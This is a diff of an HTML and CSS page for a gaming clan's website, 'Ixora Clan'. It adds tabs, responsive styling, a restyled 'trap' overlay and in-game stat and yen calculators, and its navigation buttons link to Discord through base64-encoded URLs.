@@ -3,96 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Ixora Clan | Access</title>
+    <title>Ixora Clan | Main Access</title>
     <link rel="icon" type="image/png" href="logo.jpg">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
     <style>
         :root { --d: #000; --tg: #b5bac1; --r: 25px; --ng: #00ff88; --nr: #ff4444; --db: #5865F2 }
         
+        /* MINECRAFT FONT IMPORT */
+        @font-face {
+            font-family: 'Minecraft';
+            src: url('minecraft.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+            font-display: swap;
+        }
+
         body { 
-            font-family: 'Segoe UI', sans-serif; 
+            font-family: 'Minecraft', sans-serif; 
             background: linear-gradient(rgba(0,0,0,.85), rgba(0,0,0,.85)), url(BGM.png) center/cover fixed; 
             margin: 0; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
-            height: 100vh; 
+            min-height: 100vh; 
             width: 100vw; 
             color: #fff; 
-            overflow: hidden; 
+            overflow-x: hidden; 
             user-select: none; 
-            cursor: none;
+            cursor: auto;
+            flex-direction: column;
+            padding: 20px 0;
         }
 
-        #customCursor { width: 20px; height: 26px; background: var(--ng); position: fixed; pointer-events: none; z-index: 99999999; clip-path: polygon(0% 0%, 100% 70%, 40% 70%, 40% 100%); filter: drop-shadow(0 0 8px var(--ng)); transition: transform .1s ease-out; top: -50px; left: -50px; }
-        
         #loader { position: fixed; inset: 0; background: #000; z-index: 9999999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity .6s, visibility .6s }
         #loader img { width: 150px; border-radius: 20px; cursor: pointer; transition: .3s; border: 2px solid #fff; margin-bottom: 20px; animation: p 2s infinite }
         
+        /* TAB BAR STYLES */
+        .tab-bar {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 15px auto 25px;
+            flex-wrap: wrap;
+            max-width: 1200px;
+            z-index: 100;
+            position: relative;
+        }
+        
+        .tab-bar button {
+            width: 130px;
+            padding: 10px 0;
+            font-size: 10px;
+            font-weight: bold;
+            font-family: 'Minecraft', sans-serif;
+            border-radius: 12px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid var(--ng);
+        }
+        
+        .tab-bar button.active {
+            background: var(--ng);
+            color: #000;
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
+            transform: scale(1.05);
+        }
+        
+        .tab-bar button:hover {
+            transform: scale(1.05);
+            opacity: 1;
+            filter: brightness(1.2);
+        }
+        
+        /* Main Calculator UI Button */
+        .btn-calc { 
+            background: linear-gradient(135deg, #4dafff, #2e91ff); 
+            box-shadow: 0 0 10px rgba(77, 175, 255, 0.6); 
+            border: none !important;
+        }
+        
+        .btn-ranks { 
+            background: linear-gradient(135deg, #ff007f, #ff00ff); 
+            box-shadow: 0 0 10px rgba(255, 0, 255, 0.6); 
+            border: none !important;
+        }
+        
+        .btn-powers { 
+            background: linear-gradient(135deg, #ffcc00, #ff8800); 
+            box-shadow: 0 0 10px rgba(255, 204, 0, 0.6); 
+            border: none !important;
+        }
+        
+        .btn-champs { 
+            background: linear-gradient(135deg, #000000, #ff0000); 
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.8); 
+            border: 1px solid #ff0000 !important; 
+        }
+        
+        .btn-codes { 
+            background: linear-gradient(135deg, #00ff88, #00bbff); 
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.6); 
+            border: none !important;
+        }
+        
+        .btn-credits { 
+            background: linear-gradient(135deg, #00ffcc, #0088ff); 
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.6); 
+            border: none !important;
+        }
+
         .form-container { 
             position: relative; 
             background: var(--d); 
             padding: 40px; 
             border-radius: var(--r); 
             width: 90%; 
-            max-width: 480px; 
-            max-height: 85vh; 
+            max-width: 1200px;
+            max-height: 80vh; 
             overflow: hidden; 
             z-index: 10; 
             box-shadow: 0 10px 50px #000; 
             display: none; 
             text-align: center;
             flex-direction: column;
-        }
-
-        .form-container.active { display: flex; animation: fi .4s ease-out; }
-        #codePage.active { max-width: 650px }
-
-        /* Scrollable Area for Buttons */
-        .social-buttons-container { 
-            display: flex; 
-            flex-direction: column; 
-            gap: 15px; 
-            overflow-y: auto; 
-            padding: 10px 10px 10px 0;
-            scrollbar-width: thin;
-            scrollbar-color: var(--ng) transparent;
-        }
-        .social-buttons-container::-webkit-scrollbar { width: 4px; }
-        .social-buttons-container::-webkit-scrollbar-thumb { background: var(--ng); border-radius: 10px; }
-
-        :root { 
-            --d: #000; 
-            --tg: #b5bac1; 
-            --r: 25px; 
-            --ng: #00ff88; /* This is your Neon Green */
-            --nr: #ff4444; 
-            --db: #5865F2;
-            /* Added Neon Animation variable */
-            --glow: 0 0 10px var(--ng), 0 0 20px var(--ng), inset 0 0 10px var(--ng);
-        }
-
-        /* ... existing body styles ... */
-
-        .form-container { 
-            position: relative; 
-            background: var(--d); 
-            padding: 40px; 
-            border-radius: var(--r); 
-            width: 90%; 
-            max-width: 480px; 
-            max-height: 85vh; 
-            overflow: hidden; 
-            z-index: 10; 
-            
-            /* ADDED NEON BORDER STYLES BELOW */
             border: 2px solid var(--ng);
             box-shadow: 0 0 15px rgba(0, 255, 136, 0.3), 0 0 30px rgba(0, 255, 136, 0.1);
             animation: neonPulse 2s infinite alternate;
-            
-            display: none; 
-            text-align: center;
-            flex-direction: column;
+        }
+
+        .form-container.active { 
+            display: flex; 
+            animation: fi .4s ease-out; 
+        }
+        
+        .form-container .social-buttons-container {
+            max-height: 60vh;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+        
+        .form-container .social-buttons-container::-webkit-scrollbar {
+            width: 5px;
+        }
+        
+        .form-container .social-buttons-container::-webkit-scrollbar-thumb {
+            background: var(--ng);
+            border-radius: 10px;
         }
 
         /* NEW ANIMATION FOR THE NEON BORDER */
@@ -108,45 +169,44 @@
         }
 
         /* Container to center the text behind the UI */
-.bg-text-container {
-    position: fixed;
-    inset: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    z-index: 0; /* Behind the form-container which is z-index 10 */
-    pointer-events: none;
-    overflow: hidden;
-}
+        .bg-text-container {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
 
-/* The IXORA text with glowing and throbbing effects */
-.bg-glow-text {
-    font-size: 15vw; /* Large responsive size */
-    font-weight: 900;
-    color: rgba(0, 255, 136, 0.05); /* Very faint base color */
-    letter-spacing: 20px;
-    text-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
-    margin: 0;
-    user-select: none;
-    /* Syncs with your existing 2s infinite pulse */
-    animation: throbGlow 2s infinite alternate ease-in-out;
-}
+        /* The IXORA text with glowing and throbbing effects */
+        .bg-glow-text {
+            font-size: 15vw;
+            font-weight: 900;
+            color: rgba(0, 255, 136, 0.05);
+            letter-spacing: 20px;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.2);
+            margin: 0;
+            user-select: none;
+            animation: throbGlow 2s infinite alternate ease-in-out;
+        }
 
-/* Throbbing animation that mimics a beat */
-@keyframes throbGlow {
-    0% {
-        transform: scale(1);
-        color: rgba(0, 255, 136, 0.05);
-        text-shadow: 0 0 20px rgba(255, 25, 0, 0.2);
-        filter: blur(2px);
-    }
-    100% {
-        transform: scale(1.1); /* Throbbing effect */
-        color: rgba(0, 255, 136, 0.15); /* Brightens on the beat */
-        text-shadow: 0 0 50px rgba(0, 47, 255, 0.6), 0 0 100px rgba(0, 255, 136, 0.2);
-        filter: blur(0px);
-    }
-}
+        /* Throbbing animation that mimics a beat */
+        @keyframes throbGlow {
+            0% {
+                transform: scale(1);
+                color: rgba(0, 255, 136, 0.05);
+                text-shadow: 0 0 20px rgba(255, 25, 0, 0.2);
+                filter: blur(2px);
+            }
+            100% {
+                transform: scale(1.1);
+                color: rgba(0, 255, 136, 0.15);
+                text-shadow: 0 0 50px rgba(0, 47, 255, 0.6), 0 0 100px rgba(0, 255, 136, 0.2);
+                filter: blur(0px);
+            }
+        }
 
         .btn-social { 
             position: relative; 
@@ -184,7 +244,385 @@
         .mute-toggle { position: absolute; top: 20px; right: 20px; width: 50px; height: 50px; background: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 100; border: none; color: #fff; font-size: 20px }
         #fireCanvas { position: fixed; bottom: 0; left: 0; width: 100%; height: 350px; z-index: 1; pointer-events: none }
         
-        .trap-screen { display: none; position: fixed; inset: 0; background: red; z-index: 999999; flex-direction: column; justify-content: center; align-items: center; animation: flR .1s infinite }
+        .trap-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; flex-direction: column; justify-content: center; align-items: center; animation: trapAnimation 3s infinite }
+        .trap-screen h1 { font-size: 4rem; color: #ff0000; margin-bottom: 20px; text-shadow: 0 0 20px #ff0000; animation: textPulse 1s infinite }
+        .trap-screen p { font-size: 1.5rem; color: #fff; text-align: center; max-width: 80%; }
+
+        input.invalid, textarea.invalid, .upload-box.invalid { border-color: var(--nr)!important }
+        .error-msg { color: var(--nr); font-size: 10px; margin-top: 4px; display: none; font-weight: 700 }
+        input.invalid + .error-msg, textarea.invalid + .error-msg, div.invalid + .error-msg { display: block }
+        
+        /* STAT CALCULATOR STYLES */
+        .stats-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .stats-input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--ng);
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: white;
+            font-size: 14px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        
+        .stats-input:focus {
+            outline: none;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+        
+        .stats-select {
+            background: rgba(0, 0, 0, 0.05);
+            border: 1px solid var(--ng);
+            border-radius: 10px;
+            padding: 12px 15px;
+            color: white;
+            font-size: 14px;
+            width: 100%;
+            cursor: pointer;
+            background-color: black
+        }
+        
+        .stats-result {
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid var(--ng);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 16px;
+            color: var(--ng);
+        }
+        
+        .stats-toggle-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 10px;
+        }
+        
+        .stats-toggle {
+            position: relative;
+            width: 50px;
+            height: 24px;
+        }
+        
+        .stats-toggle input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .stats-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #333;
+            border-radius: 34px;
+            transition: .4s;
+        }
+        
+        .stats-slider:before {
+            position: absolute;
+            content: "";
+            height: 18px;
+            width: 18px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            border-radius: 50%;
+            transition: .4s;
+        }
+        
+        .stats-toggle input:checked + .stats-slider {
+            background-color: var(--ng);
+        }
+        
+        .stats-toggle input:checked + .stats-slider:before {
+            transform: translateX(26px);
+        }
+        
+        #boostMinutes::placeholder {
+        color: rgba(255, 255, 255, 0.6) !important;
+        }
+
+        .calc-btn {
+            background: linear-gradient(45deg, var(--ng), #00cc66);
+            border: none;
+            border-radius: 10px;
+            padding: 15px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .calc-btn:hover {
+            background: linear-gradient(45deg, #00cc66, var(--ng));
+            transform: scale(1.02);
+        }
+        
+        .calc-label {
+            color: var(--ng);
+            font-size: 12px;
+            text-align: left;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 600;
+        }
+        
+        /* RANKS, POWERS, CHAMPIONS, CODES, CREDITS STYLES */
+        .req-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(155, 94, 255, 0.3);
+            border-left: 6px solid #9b5eff;
+            padding: 18px;
+            margin: 15px 0;
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            font-size: 18px;
+            font-weight: 700;
+            color: #9b5eff;
+            transition: transform 0.2s ease, border-color 0.2s ease;
+            text-align: left;
+        }
+        
+        .req-item:hover {
+            transform: translateX(10px);
+            border-color: var(--ng);
+        }
+        
+        .req-val {
+            font-size: 14px;
+            font-weight: 400;
+            color: #cccccc;
+            margin-top: 8px;
+            line-height: 1.4;
+            width: 100%;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding-top: 8px;
+        }
+        
+
+        .transfer-btn {
+            width: auto;
+            padding: 6px 12px;
+            font-size: 11px;
+            background: var(--ng);
+            color: #000;
+            border-radius: 6px;
+            cursor: pointer;
+            border: none;
+            font-weight: bold;
+            font-family: 'Minecraft';
+            margin-top: 10px;
+        }
+        
+        /* CHAMPION CARD STYLES - BOX STYLE */
+        .champion-box {
+            background: rgba(15, 15, 15, 0.95);
+            border: 2px solid #444;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 10px 0;
+            transition: all 0.3s ease;
+            position: relative;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .champion-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.4);
+            border-color: #00ff22;
+            background: rgba(25, 5, 5, 0.98);
+        }
+        
+        .champion-name-header {
+            font-family: 'Minecraft';
+            font-size: 1.2rem;
+            color: #ffffff;
+            margin: 0;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding-bottom: 5px;
+            border-bottom: 2px solid rgba(255, 0, 0, 0.5);
+        }
+        
+        .badge {
+            font-size: 10px;
+            padding: 4px 10px;
+            border-radius: 4px;
+            text-transform: uppercase;
+            font-family: 'Minecraft';
+            font-weight: bold;
+            display: inline-block;
+            margin-right: 5px;
+            margin-bottom: 5px;
+        }
+        
+        .badge-chance {
+            background: #000;
+            color: #ffcc00;
+            border: 1px solid #ff0000;
+        }
+        
+        .badge-board {
+            background: #000;
+            color: #0088ff;
+            border: 1px solid #ff0000;
+        }
+        
+        .champ-desc-box {
+            font-size: 13px;
+            line-height: 1.5;
+            color: #eeeeee;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px;
+            border: 1px solid rgba(255, 0, 0, 0.2);
+            border-radius: 5px;
+            margin-top: 5px;
+        }
+        
+        /* CHAMPION SEARCH BAR */
+        .search-container {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        
+        #championSearch {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 14px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--ng);
+            border-radius: 10px;
+            color: white;
+            margin-bottom: 10px;
+        }
+        
+        .filter-btn {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 12px;
+            margin-right: 5px;
+            margin-bottom: 5px;
+            transition: all 0.3s;
+        }
+        
+        .filter-btn:hover {
+            opacity: 0.8;
+            transform: scale(1.05);
+        }
+        
+        .credits-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .credit-item {
+            border: 1px solid var(--ng);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            background: rgba(0, 255, 136, 0.05);
+        }
+        
+        .credit-role {
+            font-size: 10px;
+            color: var(--ng);
+            text-transform: uppercase;
+        }
+        
+        .credit-name {
+            font-weight: bold;
+            margin-top: 5px;
+            font-size: 14px;
+        }
+        
+        /* Yen Calculator Styles */
+        .yen-section {
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px dashed var(--ng);
+        }
+        
+        .efficiency-card {
+            border-color: #00ffcc;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            background: rgba(0, 255, 204, 0.05);
+        }
+        
+        .efficiency-card h2 {
+            font-size: 18px;
+            margin-bottom: 5px;
+            color: #00ffcc;
+        }
+
+        @keyframes earthquake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        .earthquake-shake {
+            animation: earthquake 0.5s infinite;
+            border-color: #ff4444 !important;
+            box-shadow: 0 0 15px #ff4444 !important;
+        }
+
+        /* TRAP ANIMATIONS */
+        @keyframes trapAnimation {
+            0% { background: #000; }
+            25% { background: #ff0000; }
+            50% { background: #000; }
+            75% { background: #8b0000; }
+            100% { background: #000; }
+        }
+        
+        @keyframes textPulse {
+            0% { text-shadow: 0 0 10px #ff0000; }
+            50% { text-shadow: 0 0 30px #ff0000, 0 0 50px #ff0000; }
+            100% { text-shadow: 0 0 10px #ff0000; }
+        }
 
         @keyframes rot { 100% { transform: rotate(360deg) } }
         @keyframes p { 0%, 100% { transform: scale(1) } 50% { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,255,255,.2) } }
@@ -193,11 +631,318 @@
         @keyframes sk { 0%, 100% { transform: translateX(0) } 25% { transform: translateX(-2px) } 75% { transform: translateX(2px) } }
         .btn-due { animation: sk .5s infinite }
 
-        @media (max-width: 480px) { .btn-social { padding: 12px; font-size: 14px; } .codes-grid { grid-template-columns: 1fr; } #customCursor { display: none } body { cursor: auto } }
+        /* RESPONSIVE DESIGN FOR PC & MOBILE */
+@media (max-width: 1024px) {
+    .tab-bar {
+        max-width: 90%;
+    }
+    
+    .form-container {
+        width: 95%;
+        padding: 25px 20px;
+    }
+}
+
+/* TABLET */
+@media (max-width: 768px) {
+    .tab-bar {
+        gap: 5px;
+        margin: 10px auto 15px;
+    }
+    
+    .tab-bar button {
+        width: 100px;
+        font-size: 9px;
+        padding: 8px 0;
+    }
+    
+    .form-container {
+        padding: 20px 15px;
+        max-height: 75vh;
+    }
+    
+    .social-buttons-container {
+        max-height: 55vh;
+    }
+    
+    .btn-social {
+        padding: 14px 20px;
+        font-size: 14px;
+    }
+    
+    .bg-glow-text {
+        font-size: 20vw;
+        letter-spacing: 10px;
+    }
+    
+    .codes-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .credits-grid {
+        grid-template-columns: 1fr;
+    }
+    
+    .champion-box {
+        padding: 12px;
+    }
+    
+    .stats-input-group {
+        gap: 10px;
+    }
+}
+
+/* MOBILE PHONES */
+@media (max-width: 480px) {
+    body {
+        padding: 10px 0;
+        min-height: 100vh;
+        align-items: stretch;
+    }
+    
+    .tab-bar {
+        gap: 4px;
+        margin: 5px auto 10px;
+    }
+    
+    .tab-bar button {
+        width: 85px;
+        font-size: 8px;
+        padding: 6px 0;
+    }
+    
+    .form-container {
+        width: 98%;
+        padding: 15px 12px;
+        max-height: 85vh;
+        margin: 0 auto;
+    }
+    
+    .social-buttons-container {
+        max-height: 70vh;
+    }
+    
+    .btn-social {
+        padding: 12px 15px;
+        font-size: 12px;
+        flex-wrap: wrap;
+    }
+    
+    .discord-count, .status-dot {
+        font-size: 9px;
+        min-width: 70px;
+        height: 20px;
+        margin-top: 5px;
+        width: 100%;
+        justify-content: center;
+    }
+    
+    h1 {
+        font-size: 1.5rem;
+        margin: 10px 0;
+    }
+    
+    p {
+        font-size: 12px;
+    }
+    
+    .bg-glow-text {
+        font-size: 25vw;
+        letter-spacing: 5px;
+    }
+    
+    .bg-text-container {
+        display: none; /* Hide background text on very small screens */
+    }
+    
+    .stats-input, .stats-select {
+        font-size: 12px;
+        padding: 10px 12px;
+    }
+    
+    .stats-toggle-row {
+        flex-wrap: wrap;
+        gap: 10px;
+    }
+    
+    .calc-btn {
+        padding: 12px;
+        font-size: 14px;
+    }
+    
+    .stats-result {
+        font-size: 12px;
+        padding: 12px;
+    }
+    
+    .champion-box {
+        padding: 10px;
+    }
+    
+    .champion-name-header {
+        font-size: 1rem;
+    }
+    
+    .champ-desc-box {
+        font-size: 11px;
+        padding: 8px;
+    }
+    
+    .search-container {
+        margin-bottom: 15px;
+    }
+    
+    #championSearch {
+        padding: 10px 12px;
+        font-size: 12px;
+    }
+    
+    .filter-btn {
+        padding: 6px 10px;
+        font-size: 10px;
+    }
+    
+    .mute-toggle {
+        top: 10px;
+        right: 10px;
+        width: 40px;
+        height: 40px;
+        font-size: 16px;
+    }
+    
+    /* For landscape orientation */
+    @media (max-height: 600px) and (orientation: landscape) {
+        .form-container {
+            max-height: 90vh;
+        }
+        
+        .social-buttons-container {
+            max-height: 80vh;
+        }
+        
+        .tab-bar {
+            margin: 5px auto 10px;
+        }
+        
+        .tab-bar button {
+            width: 80px;
+            padding: 4px 0;
+        }
+    }
+}
+
+/* VERY SMALL PHONES */
+@media (max-width: 320px) {
+    .tab-bar button {
+        width: 75px;
+        font-size: 7px;
+    }
+    
+    .form-container {
+        padding: 12px 10px;
+    }
+    
+    .btn-social {
+        padding: 10px 12px;
+        font-size: 11px;
+    }
+    
+    h1 {
+        font-size: 1.3rem;
+    }
+}
+
+        @media (max-width: 768px) {
+            .tab-bar {
+                gap: 5px;
+            }
+            
+            .tab-bar button {
+                width: 100px;
+                font-size: 9px;
+                padding: 8px 0;
+            }
+            
+            .form-container {
+                padding: 20px;
+                max-height: 70vh;
+            }
+            
+            .credits-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .codes-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .champion-box {
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) { 
+            .btn-social { padding: 12px; font-size: 14px; } 
+            .codes-grid { grid-template-columns: 1fr; } 
+            body { cursor: auto } 
+            .stats-result { font-size: 14px; padding: 12px; }
+            .tab-bar button {
+                width: 90px;
+                font-size: 8px;
+                padding: 6px 0;
+            }
+            
+            .trap-screen h1 {
+                font-size: 2.5rem;
+            }
+            
+            .trap-screen p {
+                font-size: 1rem;
+            }
+        }
+
+        .text-minecraft {
+            font-family: "Minecraft";
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* NEW TRAP STYLES */
+        .trap-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            animation: trapAnimation 3s infinite;
+        }
+        
+        .trap-screen h1 {
+            font-size: 4rem;
+            color: #ff0000;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px #ff0000;
+            animation: textPulse 1s infinite;
+        }
+        
+        .trap-screen p {
+            font-size: 1.5rem;
+            color: #fff;
+            text-align: center;
+            max-width: 80%;
+        }
     </style>
 </head>
 <body>
-    <div id="customCursor"></div>
+    <!-- REMOVED CUSTOM CURSOR DIV -->
     <div id="loader"><img src="logo.jpg" id="startBtn"><p>CLICK LOGO TO ENTER</p></div>
     
     <audio id="v1" preload="auto"><source src="labsong.mp3" type="audio/mpeg"></audio>
@@ -205,34 +950,281 @@
     <audio id="bgMusic" loop><source src="IXORA EY.mp3" type="audio/mpeg"></audio>
     <button class="mute-toggle" id="muteBtn"><i class="bi bi-volume-mute-fill" id="muteIcon"></i></button>
 
+    <!-- TAB BAR -->
+    <div class="tab-bar" id="mainTabBar">
+        <button id="mainTabBtn" class="active btn-calc" onclick="showTab('mainPage', this)">Main UI</button>
+        <button class="btn-ranks" onclick="showTab('ranksPage', this)">Ranks</button>
+        <button class="btn-powers" onclick="showTab('powersPage', this)">Powers</button>
+        <button class="btn-champs" onclick="showTab('championsPage', this)">Champions</button>
+        <button class="btn-codes" onclick="showTab('codesPage', this)">Codes</button>
+        <button class="btn-credits" onclick="showTab('creditsPage', this)">Credits</button>
+    </div>
+
+    <!-- MAIN UI PAGE (Original Ixora Clan UI) -->
     <div class="form-container active" id="mainPage">
         <img src="logo.jpg" style="width:100px; border-radius:15px; margin: 0 auto 15px;">
         <h1>Welcome to Ixora Clan</h1>
         <p>Sabay sabay tayong lumakas!</p>
         <div class="social-buttons-container">
             <button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmdnL3NYY2N5MmZ5Tlo=')" class="btn-social">
-                <span><i class="bi bi-discord"></i> Ixora Main Server</span>
+                <span class="text-minecraft"><i class="bi bi-discord"></i> Ixora Main Server</span>
                 <span class="discord-count" id="discordOnline">Check...</span>
             </button>
             <button onclick="_nav('aHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy8xNDU5NDk5NDgxMDgxODM5NzgzLzE0NTk0OTk0ODI0Nzg4MDUxNzAvMTQ2MzE1Njk3MzczNzYwNzI4MQ==')" class="btn-social">
-                <span><i class="bi bi-shield-check"></i> Gain Access</span>
+                <span class="text-minecraft"><i class="bi bi-shield-check"></i> Gain Access</span>
             </button>
             <button onclick="_page('serverPage')" class="btn-social">
-                <span><i class="bi bi-controller"></i> Private Servers</span>
+                <span class="text-minecraft"><i class="bi bi-controller"></i> Private Servers</span>
             </button>
-            <button onclick="_page('codePage')" class="btn-social">
-                <span><i class="bi bi-code-slash"></i> Redeem Codes</span>
+            <button onclick="_page('statsPage')" class="btn-social">
+                <span class="text-minecraft"><i class="bi bi-calculator"></i> Stat Calculator</span>
             </button>
             <button onclick="_page('trustedSeller')" class="btn-social">
-                <span><i class="bi bi-patch-check-fill"></i> Certified Trusted Seller</span>
+                <span class="text-minecraft"><i class="bi bi-patch-check-fill"></i> Certified Trusted Seller</span>
             </button>
         </div>
     </div>
 
-    <div class="bg-text-container">
-    <h1 class="bg-glow-text">IXORA</h1>
+    <!-- STAT CALCULATOR PAGE -->
+    <div class="form-container" id="statsPage">
+        <h1>Stat Calculator</h1>
+        <div class="social-buttons-container">
+            <div class="stats-input-group">
+                <label class="calc-label">Select Stat</label>
+                <select id="statOption" class="stats-select">
+                    <option value="Strength" style="background-color: black;">Strength</option>
+                    <option value="Durability" style="background-color: black;">Durability</option>
+                    <option value="Chakra" style="background-color: black;">Chakra</option>
+                    <option value="Sword" style="background-color: black;">Sword</option>
+                </select>
+
+                <div class="boost-section">
+                    <label style="color: #00ffcc; margin-top: 0; font-size: 11px;">Server Boost (Mins)</label>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                        <input id="boostMinutes" type="number" placeholder="60" style="border: 1px solid var(--ng); background-color: rgba(0, 0, 0, 0.873);flex: 2; padding: 8px; order: 1; color: white !important; font-weight: bold;">
+                        <div id="boostError" class="error-msg" style="order: 3; width: 100%;">Incorrect nga BulBol Ka Ba?</div>
+                        <button onclick="startBoost()" style="order: 2; flex: 1; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px;">START</button>
+                    </div>
+                    <div id="countdownDisplay" class="boost-timer-display">BOOST ACTIVE: <span id="timerText">00:00</span> (x1.5)</div>
+                </div>
+
+                <div class="stats-toggle-row">
+                    <span>AFK Mode</span>
+                    <label class="stats-toggle">
+                        <input type="checkbox" id="afkSwitch" checked>
+                        <span class="stats-slider"></span>
+                    </label>
+                    <span>Clicking Mode</span>
+                    <label class="stats-toggle">
+                        <input type="checkbox" id="clickingSwitch">
+                        <span class="stats-slider"></span>
+                    </label>
+                </div>
+                
+                <label class="calc-label">Stat per Tick</label>
+                <input id="statPerTick" class="stats-input" placeholder="e.g. 1M">
+                
+                <label class="calc-label">Current Stats</label>
+                <input id="currentStats" class="stats-input" placeholder="e.g. 10M">
+                
+                <label class="calc-label">Wanted Stats</label>
+                <input id="wantedStats" class="stats-input" placeholder="e.g. 1B">
+                
+                <label class="calc-label">Champion per Tick</label>
+                <input id="championTickStat" class="stats-input" value="0" placeholder="Optional">
+                
+                <button class="calc-btn" onclick="calculateStats()">Calculate</button>
+            </div>
+            
+            <div class="stats-result" id="statGainPerMinute">Per Minute: 0</div>
+            <div class="stats-result" id="timeToReach">Time: 0d 0h 0m</div>
+            
+            <!-- YEN CALCULATOR SECTION -->
+            <div class="yen-section">
+                <h3 style="color: var(--ng); font-size: 14px; text-align: center; font-family: 'Minecraft'; margin-bottom: 15px;">Yen Calculator</h3>
+                
+                <label class="calc-label">Rank Multiplier</label>
+                <select id="rank" class="stats-select" onchange="calculateCoins()">
+                    <option value="5">Fighter</option>
+                    <option value="10">Shinobi</option>
+                    <option value="25">Pirate</option>
+                    <option value="50">Ghoul</option>
+                    <option value="100">Hero</option>
+                    <option value="500">Reaper</option>
+                    <option value="1000">Saiyan</option>
+                    <option value="2500">Sin</option>
+                    <option value="10000">Magi</option>
+                    <option value="45000">Akuma</option>
+                    <option value="100000">Yonko</option>
+                    <option value="250000">Gorosei</option>
+                    <option value="750000">Overlord</option>
+                    <option value="4500000">Hokage</option>
+                    <option value="25000000">Kaioshin</option>
+                    <option value="150000000">Sage</option>
+                    <option value="500000000">Espada</option>
+                    <option value="7500000000">Shinigami</option>
